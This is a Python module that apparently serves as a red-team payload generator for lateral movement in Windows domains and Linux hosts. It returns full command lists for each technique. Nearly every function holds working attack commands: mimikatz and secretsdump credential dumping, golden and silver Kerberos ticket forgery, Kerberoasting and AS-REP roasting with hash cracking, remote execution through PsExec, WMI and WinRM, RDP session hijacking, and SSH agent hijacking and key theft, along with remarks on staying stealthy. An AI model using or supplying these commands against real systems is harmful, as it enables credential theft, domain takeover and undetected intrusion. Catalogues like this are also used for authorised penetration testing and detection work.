"""
Lateral Movement Module
Techniques for moving laterally across networks using various protocols and credential reuse.
"""

import asyncio
import json
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Literal
from enum import Enum


class LateralTechnique(str, Enum):
    """Lateral movement techniques"""
    PASS_THE_HASH = "pass_the_hash"
    PASS_THE_TICKET = "pass_the_ticket"
    OVERPASS_THE_HASH = "overpass_the_hash"
    GOLDEN_TICKET = "golden_ticket"
    SILVER_TICKET = "silver_ticket"
    ASREP_ROASTING = "asrep_roasting"
    KERBEROASTING = "kerberoasting"
    PSEXEC = "psexec"
    WMIEXEC = "wmiexec"
    DCOM_EXEC = "dcom_exec"
    WINRM = "winrm"
    RDP_HIJACKING = "rdp_hijacking"
    SSH_HIJACKING = "ssh_hijacking"
    TOKEN_MANIPULATION = "token_manipulation"


@dataclass
class LateralMovementPayload:
    """Lateral movement payload details"""
    technique: LateralTechnique
    platform: str  # windows, linux
    commands: List[str]
    description: str
    requires_credentials: bool
    requires_admin: bool
    stealth_level: str  # low, medium, high
    mitre_technique: str
    
    def to_dict(self) -> Dict:
        return {
            "technique": self.technique.value,
            "platform": self.platform,
            "commands": self.commands,
            "description": self.description,
            "requires_credentials": self.requires_credentials,
            "requires_admin": self.requires_admin,
            "stealth_level": self.stealth_level,
            "mitre_technique": self.mitre_technique
        }


class LateralMovementGenerator:
    """Generator for lateral movement techniques"""
    
    def __init__(self):
        pass
    
    async def generate_pass_the_hash(self) -> LateralMovementPayload:
        """Generate Pass-the-Hash attack commands"""
        
        commands = [
            "# Pass-the-Hash (PTH) - Use NTLM hash without knowing password",
            "",
            "# Method 1: Mimikatz",
            "mimikatz.exe 'privilege::debug' 'sekurlsa::pth /user:Administrator /domain:CORP /ntlm:<NTLM_HASH> /run:cmd.exe' 'exit'",
            "",
            "# Method 2: Invoke-Mimikatz (PowerShell)",
            "Invoke-Mimikatz -Command '\"privilege::debug\" \"sekurlsa::pth /user:Administrator /domain:CORP /ntlm:<NTLM_HASH> /run:powershell.exe\"'",
            "",
            "# Method 3: Impacket psexec.py",
            "psexec.py -hashes :<NTLM_HASH> CORP/Administrator@192.168.1.10",
            "",
            "# Method 4: Impacket wmiexec.py",
            "wmiexec.py -hashes :<NTLM_HASH> CORP/Administrator@192.168.1.10",
            "",
            "# Method 5: Impacket smbexec.py",
            "smbexec.py -hashes :<NTLM_HASH> CORP/Administrator@192.168.1.10",
            "",
            "# Method 6: CrackMapExec",
            "crackmapexec smb 192.168.1.10 -u Administrator -H <NTLM_HASH> -x 'whoami'",
            "",
            "# Method 7: Evil-WinRM",
            "evil-winrm -i 192.168.1.10 -u Administrator -H <NTLM_HASH>",
            "",
            "# Extract hashes for PTH:",
            "# From LSASS:",
            "mimikatz.exe 'privilege::debug' 'sekurlsa::logonpasswords' 'exit'",
            "# From SAM:",
            "mimikatz.exe 'privilege::debug' 'lsadump::sam' 'exit'",
            "# From NTDS.dit:",
            "secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL"
        ]
        
        return LateralMovementPayload(
            technique=LateralTechnique.PASS_THE_HASH,
            platform="windows",
            commands=commands,
            description="Pass-the-Hash - Authenticate using NTLM hash without knowing plaintext password",
            requires_credentials=True,
            requires_admin=False,
            stealth_level="medium",
            mitre_technique="T1550.002"
        )
    
    async def generate_pass_the_ticket(self) -> LateralMovementPayload:
        """Generate Pass-the-Ticket attack commands"""
        
        commands = [
            "# Pass-the-Ticket (PTT) - Use Kerberos tickets for authentication",
            "",
            "# Step 1: Export tickets from current session",
            "mimikatz.exe 'privilege::debug' 'sekurlsa::tickets /export' 'exit'",
            "",
            "# Step 2: List exported tickets",
            "dir *.kirbi",
            "",
            "# Step 3: Inject ticket into current session",
            "mimikatz.exe 'kerberos::ptt <ticket_file>.kirbi' 'exit'",
            "",
            "# Step 4: Verify ticket injection",
            "klist",
            "",
            "# Step 5: Access remote resource",
            "dir \\\\\\\\target-server\\\\c$",
            "",
            "# Alternative: Rubeus (C# Kerberos tool)",
            "# Export tickets:",
            "Rubeus.exe dump /service:krbtgt",
            "",
            "# Inject ticket:",
            "Rubeus.exe ptt /ticket:<base64_ticket>",
            "",
            "# Convert .kirbi to .ccache for Linux:",
            "ticketConverter.py ticket.kirbi ticket.ccache",
            "export KRB5CCNAME=ticket.ccache",
            "psexec.py -k -no-pass CORP/Administrator@target-server.corp.local"
        ]
        
        return LateralMovementPayload(
            technique=LateralTechnique.PASS_THE_TICKET,
            platform="windows",
            commands=commands,
            description="Pass-the-Ticket - Steal and reuse Kerberos tickets for lateral movement",
            requires_credentials=False,
            requires_admin=True,
            stealth_level="high",
            mitre_technique="T1550.003"
        )
    
    async def generate_golden_ticket(self) -> LateralMovementPayload:
        """Generate Golden Ticket attack commands"""
        
        commands = [
            "# Golden Ticket - Forge TGT using krbtgt hash (full domain access)",
            "",
            "# Prerequisites:",
            "# 1. krbtgt account NTLM hash",
            "# 2. Domain SID",
            "# 3. Domain FQDN",
            "",
            "# Step 1: Get domain SID",
            "whoami /user",
            "# OR",
            "Get-ADDomain | Select-Object -ExpandProperty DomainSID",
            "",
            "# Step 2: Get krbtgt hash (requires Domain Admin)",
            "mimikatz.exe 'privilege::debug' 'lsadump::dcsync /user:krbtgt' 'exit'",
            "# OR from NTDS.dit:",
            "secretsdump.py -just-dc-user krbtgt CORP/Administrator@dc.corp.local",
            "",
            "# Step 3: Create Golden Ticket",
            "mimikatz.exe 'kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-xxxx-xxxx-xxxx /krbtgt:<NTLM_HASH> /ptt' 'exit'",
            "",
            "# OR with specific duration (default 10 years):",
            "mimikatz.exe 'kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-xxxx-xxxx-xxxx /krbtgt:<NTLM_HASH> /endin:600 /renewmax:10080 /ptt' 'exit'",
            "",
            "# Verify ticket:",
            "klist",
            "",
            "# Access any machine in domain:",
            "dir \\\\\\\\dc\\\\c$",
            "psexec.exe \\\\\\\\dc cmd",
            "",
            "# Using Rubeus:",
            "Rubeus.exe golden /rc4:<NTLM_HASH> /user:Administrator /domain:corp.local /sid:S-1-5-21-xxxx-xxxx-xxxx /ptt",
            "",
            "# Using Impacket:",
            "ticketer.py -nthash <NTLM_HASH> -domain-sid S-1-5-21-xxxx-xxxx-xxxx -domain corp.local Administrator"
        ]
        
        return LateralMovementPayload(
            technique=LateralTechnique.GOLDEN_TICKET,
            platform="windows",
            commands=commands,
            description="Golden Ticket - Forge Kerberos TGT for complete domain access (requires krbtgt hash)",
            requires_credentials=True,
            requires_admin=True,
            stealth_level="high",
            mitre_technique="T1558.001"
        )
    
    async def generate_silver_ticket(self) -> LateralMovementPayload:
        """Generate Silver Ticket attack commands"""
        
        commands = [
            "# Silver Ticket - Forge TGS for specific service",
            "",
            "# Advantages over Golden Ticket:",
            "# - Doesn't contact DC (stealthier)",
            "# - Only requires service account hash (not krbtgt)",
            "# - Works even if krbtgt password is changed",
            "",
            "# Step 1: Get service account hash",
            "# Example: Target CIFS service on file-server",
            "mimikatz.exe 'privilege::debug' 'sekurlsa::logonpasswords' 'exit'",
            "# OR DCSync specific service account:",
            "mimikatz.exe 'lsadump::dcsync /user:file-server$' 'exit'",
            "",
            "# Step 2: Create Silver Ticket for CIFS service",
            "mimikatz.exe 'kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-xxxx-xxxx-xxxx /target:file-server.corp.local /service:cifs /rc4:<NTLM_HASH> /ptt' 'exit'",
            "",
            "# Step 3: Access the service",
            "dir \\\\\\\\file-server.corp.local\\\\c$",
            "",
            "# Common services for Silver Ticket:",
            "# CIFS - File sharing (port 445)",
            "# HTTP - Web services (port 80/443)",
            "# MSSQL - SQL Server (port 1433)",
            "# LDAP - Directory services (port 389/636)",
            "# HOST - Multiple services (scheduled tasks, WMI)",
            "",
            "# Example: Silver Ticket for SQL Server",
            "mimikatz.exe 'kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-xxxx-xxxx-xxxx /target:sql-server.corp.local /service:MSSQLSvc /rc4:<NTLM_HASH> /ptt' 'exit'",
            "",
            "# Using Rubeus:",
            "Rubeus.exe silver /service:cifs/file-server.corp.local /rc4:<NTLM_HASH> /user:Administrator /domain:corp.local /sid:S-1-5-21-xxxx-xxxx-xxxx /ptt"
        ]
        
        return LateralMovementPayload(
            technique=LateralTechnique.SILVER_TICKET,
            platform="windows",
            commands=commands,
            description="Silver Ticket - Forge Kerberos TGS for specific service (stealthier than Golden Ticket)",
            requires_credentials=True,
            requires_admin=False,
            stealth_level="high",
            mitre_technique="T1558.002"
        )
    
    async def generate_kerberoasting(self) -> LateralMovementPayload:
        """Generate Kerberoasting attack commands"""
        
        commands = [
            "# Kerberoasting - Extract service account hashes for offline cracking",
            "",
            "# Method 1: PowerView (PowerShell)",
            "# Get all service accounts with SPN:",
            "Get-NetUser -SPN | Select-Object samaccountname,serviceprincipalname",
            "",
            "# Request TGS for service accounts:",
            "Add-Type -AssemblyName System.IdentityModel",
            "New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'HTTP/web-server.corp.local'",
            "",
            "# Export tickets:",
            "mimikatz.exe 'kerberos::list /export' 'exit'",
            "",
            "# Method 2: Rubeus",
            "# Request all TGS tickets:",
            "Rubeus.exe kerberoast /outfile:kerberoast_hashes.txt",
            "",
            "# Request specific service:",
            "Rubeus.exe kerberoast /user:svc_sql /outfile:sql_hash.txt",
            "",
            "# Method 3: Impacket GetUserSPNs.py",
            "GetUserSPNs.py -request -dc-ip 192.168.1.5 CORP/user:password",
            "",
            "# Save hashes:",
            "GetUserSPNs.py -request -dc-ip 192.168.1.5 CORP/user:password -outputfile kerberoast.txt",
            "",
            "# Method 4: Invoke-Kerberoast (PowerShell)",
            "Invoke-Kerberoast -OutputFormat Hashcat | Select-Object Hash | Out-File -FilePath hashes.txt",
            "",
            "# Crack hashes offline:",
            "# Hashcat (mode 13100 for TGS-REP):",
            "hashcat -m 13100 kerberoast.txt rockyou.txt",
            "",
            "# John the Ripper:",
            "john --wordlist=rockyou.txt kerberoast.txt"
        ]
        
        return LateralMovementPayload(
            technique=LateralTechnique.KERBEROASTING,
            platform="windows",
            commands=commands,
            description="Kerberoasting - Extract service account hashes and crack offline to get plaintext passwords",
            requires_credentials=True,
            requires_admin=False,
            stealth_level="medium",
            mitre_technique="T1558.003"
        )
    
    async def generate_asrep_roasting(self) -> LateralMovementPayload:
        """Generate AS-REP Roasting attack commands"""
        
        commands = [
            "# AS-REP Roasting - Extract hashes from accounts with 'Do not require Kerberos preauthentication'",
            "",
            "# Find vulnerable accounts (PowerView):",
            "Get-DomainUser -PreauthNotRequired | Select-Object samaccountname",
            "",
            "# Method 1: Rubeus",
            "Rubeus.exe asreproast /format:hashcat /outfile:asrep_hashes.txt",
            "",
            "# Target specific user:",
            "Rubeus.exe asreproast /user:vulnerable_user /format:hashcat",
            "",
            "# Method 2: Impacket GetNPUsers.py",
            "# Enumerate vulnerable users:",
            "GetNPUsers.py CORP/ -dc-ip 192.168.1.5 -usersfile users.txt",
            "",
            "# Request AS-REP for specific user:",
            "GetNPUsers.py CORP/vulnerable_user -no-pass -dc-ip 192.168.1.5",
            "",
            "# Save hashes:",
            "GetNPUsers.py CORP/ -dc-ip 192.168.1.5 -usersfile users.txt -format hashcat -outputfile asrep.txt",
            "",
            "# Method 3: PowerView + ASREPRoast.ps1",
            "Import-Module .\\ASREPRoast.ps1",
            "Invoke-ASREPRoast -Domain corp.local | Out-File asrep_hashes.txt",
            "",
            "# Crack hashes offline:",
            "# Hashcat (mode 18200 for AS-REP):",
            "hashcat -m 18200 asrep.txt rockyou.txt",
            "",
            "# John the Ripper:",
            "john --wordlist=rockyou.txt asrep.txt"
        ]
        
        return LateralMovementPayload(
            technique=LateralTechnique.ASREP_ROASTING,
            platform="windows",
            commands=commands,
            description="AS-REP Roasting - Extract hashes from accounts without Kerberos pre-authentication",
            requires_credentials=False,
            requires_admin=False,
            stealth_level="low",
            mitre_technique="T1558.004"
        )
    
    async def generate_psexec(self) -> LateralMovementPayload:
        """Generate PSExec lateral movement commands"""
        
        commands = [
            "# PSExec - Execute commands remotely via SMB",
            "",
            "# Method 1: SysInternals PSExec",
            "psexec.exe \\\\\\\\192.168.1.10 -u CORP\\Administrator -p Password123 cmd",
            "",
            "# With hash:",
            "psexec.exe \\\\\\\\192.168.1.10 -u CORP\\Administrator -hashes :<NTLM_HASH> cmd",
            "",
            "# Method 2: Impacket psexec.py",
            "psexec.py CORP/Administrator:Password123@192.168.1.10",
            "",
            "# With hash:",
            "psexec.py -hashes :<NTLM_HASH> CORP/Administrator@192.168.1.10",
            "",
            "# Method 3: CrackMapExec",
            "crackmapexec smb 192.168.1.10 -u Administrator -p Password123 -x 'whoami'",
            "",
            "# Execute PowerShell:",
            "crackmapexec smb 192.168.1.10 -u Administrator -p Password123 -X 'Get-Process'",
            "",
            "# Method 4: Metasploit",
            "use exploit/windows/smb/psexec",
            "set RHOST 192.168.1.10",
            "set SMBUser Administrator",
            "set SMBPass Password123",
            "exploit",
            "",
            "# Stealthy: Use named pipes",
            "psexec.exe \\\\\\\\192.168.1.10 -u CORP\\Administrator -p Password123 -s -accepteula cmd"
        ]
        
        return LateralMovementPayload(
            technique=LateralTechnique.PSEXEC,
            platform="windows",
            commands=commands,
            description="PSExec - Remote command execution via SMB service (requires admin)",
            requires_credentials=True,
            requires_admin=True,
            stealth_level="low",
            mitre_technique="T1021.002"
        )
    
    async def generate_wmiexec(self) -> LateralMovementPayload:
        """Generate WMI execution commands"""
        
        commands = [
            "# WMI Execution - Execute commands via Windows Management Instrumentation",
            "",
            "# Method 1: Native wmic",
            "wmic /node:192.168.1.10 /user:Administrator /password:Password123 process call create 'cmd.exe /c whoami'",
            "",
            "# Method 2: PowerShell WMI",
            "$cred = Get-Credential",
            "$session = New-CimSession -ComputerName 192.168.1.10 -Credential $cred",
            "Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine='cmd.exe /c whoami'}",
            "",
            "# Method 3: Impacket wmiexec.py (semi-interactive shell)",
            "wmiexec.py CORP/Administrator:Password123@192.168.1.10",
            "",
            "# With hash:",
            "wmiexec.py -hashes :<NTLM_HASH> CORP/Administrator@192.168.1.10",
            "",
            "# Method 4: CrackMapExec",
            "crackmapexec wmi 192.168.1.10 -u Administrator -p Password123 -x 'whoami'",
            "",
            "# Method 5: PowerSploit Invoke-WmiCommand",
            "Invoke-WmiCommand -ComputerName 192.168.1.10 -ScriptBlock {Get-Process} -Credential $cred",
            "",
            "# Stealthy: No file drops, only in-memory execution",
            "# WMI is commonly used by admins, blends with normal activity"
        ]
        
        return LateralMovementPayload(
            technique=LateralTechnique.WMIEXEC,
            platform="windows",
            commands=commands,
            description="WMI Execution - Remote command execution via WMI (stealthier than PSExec)",
            requires_credentials=True,
            requires_admin=True,
            stealth_level="medium",
            mitre_technique="T1047"
        )
    
    async def generate_winrm(self) -> LateralMovementPayload:
        """Generate WinRM lateral movement commands"""
        
        commands = [
            "# WinRM (Windows Remote Management) - PowerShell remoting",
            "",
            "# Enable WinRM on target (if needed):",
            "Enable-PSRemoting -Force",
            "",
            "# Method 1: PowerShell remoting",
            "$cred = Get-Credential",
            "Enter-PSSession -ComputerName 192.168.1.10 -Credential $cred",
            "",
            "# Execute command:",
            "Invoke-Command -ComputerName 192.168.1.10 -Credential $cred -ScriptBlock {whoami}",
            "",
            "# Multiple targets:",
            "Invoke-Command -ComputerName server1,server2,server3 -Credential $cred -ScriptBlock {Get-Process}",
            "",
            "# Method 2: Evil-WinRM (Kali Linux tool)",
            "evil-winrm -i 192.168.1.10 -u Administrator -p Password123",
            "",
            "# With hash:",
            "evil-winrm -i 192.168.1.10 -u Administrator -H <NTLM_HASH>",
            "",
            "# Upload/Download files:",
            "evil-winrm -i 192.168.1.10 -u Administrator -p Password123 -e /path/to/exes -s /path/to/scripts",
            "",
            "# Method 3: CrackMapExec",
            "crackmapexec winrm 192.168.1.10 -u Administrator -p Password123 -x 'whoami'",
            "",
            "# Ports: 5985 (HTTP), 5986 (HTTPS)"
        ]
        
        return LateralMovementPayload(
            technique=LateralTechnique.WINRM,
            platform="windows",
            commands=commands,
            description="WinRM - PowerShell remoting for lateral movement (requires WinRM enabled)",
            requires_credentials=True,
            requires_admin=True,
            stealth_level="medium",
            mitre_technique="T1021.006"
        )
    
    async def generate_rdp_hijacking(self) -> LateralMovementPayload:
        """Generate RDP session hijacking commands"""
        
        commands = [
            "# RDP Session Hijacking - Take over existing RDP sessions",
            "",
            "# Step 1: List active RDP sessions",
            "query user",
            "# OR",
            "qwinsta",
            "",
            "# Step 2: Identify target session ID",
            "# Output shows: USERNAME, SESSIONNAME, ID, STATE",
            "",
            "# Step 3: Hijack session (requires SYSTEM privileges)",
            "# As SYSTEM:",
            "tscon <SESSION_ID> /dest:<CURRENT_SESSION>",
            "",
            "# Example: Hijack session 2 to current session 1:",
            "tscon 2 /dest:console",
            "",
            "# If not SYSTEM, use PsExec to become SYSTEM:",
            "psexec.exe -s -i cmd.exe",
            "# Then run tscon",
            "",
            "# Method 2: PowerShell",
            "$sessionId = 2",
            "& tscon $sessionId",
            "",
            "# Disconnect user session (without logging them out):",
            "logoff <SESSION_ID>",
            "",
            "# Mitre ATT&CK: T1563.002 (RDP Hijacking)",
            "# Detection: Monitor tscon.exe usage, especially with SYSTEM privileges"
        ]
        
        return LateralMovementPayload(
            technique=LateralTechnique.RDP_HIJACKING,
            platform="windows",
            commands=commands,
            description="RDP Hijacking - Take over active RDP sessions without knowing passwords",
            requires_credentials=False,
            requires_admin=True,
            stealth_level="high",
            mitre_technique="T1563.002"
        )
    
    async def generate_ssh_hijacking(self) -> LateralMovementPayload:
        """Generate SSH session hijacking commands"""
        
        commands = [
            "# SSH Session Hijacking - Hijack existing SSH connections",
            "",
            "# Method 1: ControlMaster hijacking",
            "# If user has ControlMaster enabled in ~/.ssh/config:",
            "# Look for control sockets:",
            "find /tmp -name 'ssh-*' -type s",
            "",
            "# Hijack socket:",
            "ssh -o ControlPath=/tmp/ssh-user@target:22 -O check target",
            "ssh -o ControlPath=/tmp/ssh-user@target:22 target 'whoami'",
            "",
            "# Method 2: SSH Agent hijacking",
            "# Find SSH agent socket:",
            "env | grep SSH_AUTH_SOCK",
            "",
            "# Hijack agent:",
            "export SSH_AUTH_SOCK=/tmp/ssh-xxxxx/agent.12345",
            "ssh-add -l  # List keys",
            "ssh user@target  # Use hijacked keys",
            "",
            "# Method 3: PTY injection (requires root)",
            "# Inject commands into existing SSH session:",
            "# Find SSH process:",
            "ps aux | grep ssh",
            "",
            "# Inject using reptyr or similar:",
            "reptyr <SSH_PID>",
            "",
            "# Method 4: SSH key theft",
            "# Copy keys from memory or disk:",
            "find /home -name id_rsa 2>/dev/null",
            "cp ~/.ssh/id_rsa /tmp/stolen_key",
            "chmod 600 /tmp/stolen_key",
            "ssh -i /tmp/stolen_key user@target"
        ]
        
        return LateralMovementPayload(
            technique=LateralTechnique.SSH_HIJACKING,
            platform="linux",
            commands=commands,
            description="SSH Hijacking - Hijack existing SSH sessions or steal SSH keys",
            requires_credentials=False,
            requires_admin=False,
            stealth_level="high",
            mitre_technique="T1563.001"
        )
    
    async def generate_all_techniques(self, platform: Literal["windows", "linux", "multi"] = "windows") -> List[LateralMovementPayload]:
        """Generate all lateral movement techniques"""
        
        techniques = []
        
        if platform in ["windows", "multi"]:
            techniques.append(await self.generate_pass_the_hash())
            techniques.append(await self.generate_pass_the_ticket())
            techniques.append(await self.generate_golden_ticket())
            techniques.append(await self.generate_silver_ticket())
            techniques.append(await self.generate_kerberoasting())
            techniques.append(await self.generate_asrep_roasting())
            techniques.append(await self.generate_psexec())
            techniques.append(await self.generate_wmiexec())
            techniques.append(await self.generate_winrm())
            techniques.append(await self.generate_rdp_hijacking())
        
        if platform in ["linux", "multi"]:
            techniques.append(await self.generate_ssh_hijacking())
        
        return techniques


async def main():
    """Example usage"""
    generator = LateralMovementGenerator()
    
    print("[*] Generating lateral movement techniques...")
    all_techniques = await generator.generate_all_techniques("multi")
    print(f"[+] Generated {len(all_techniques)} lateral movement techniques")
    
    # Display Pass-the-Hash
    pth = [t for t in all_techniques if t.technique == LateralTechnique.PASS_THE_HASH][0]
    print(f"\n[+] Pass-the-Hash:")
    print(f"    Stealth Level: {pth.stealth_level}")
    print(f"    MITRE: {pth.mitre_technique}")
    print(f"    Requires Admin: {pth.requires_admin}")


if __name__ == "__main__":
    asyncio.run(main())
